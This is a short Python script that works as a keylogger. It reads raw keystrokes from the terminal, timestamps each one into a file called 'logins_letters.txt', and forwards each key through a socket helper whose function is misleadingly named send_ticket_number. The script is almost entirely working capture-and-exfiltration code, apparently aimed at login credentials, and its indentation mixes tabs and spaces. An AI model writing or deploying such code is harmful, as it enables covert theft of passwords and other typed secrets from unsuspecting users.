import tty
import sys
import termios
import send_socket as ss
import time
from datetime import datetime

orig_settings = termios.tcgetattr(sys.stdin)
file = open("logins_letters.txt", "a")

tty.setraw(sys.stdin)
x = 0
while x != chr(27): # ESC
    x=sys.stdin.read(1)[0]
    if len(x) > 0:
    	ss.send_ticket_number(x+"aaaaaa")
	file.write(x + " ; " + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + "\n")
	file.flush()

termios.tcsetattr(sys.stdin, termios.TCSADRAIN, orig_settings)
file.close()	 
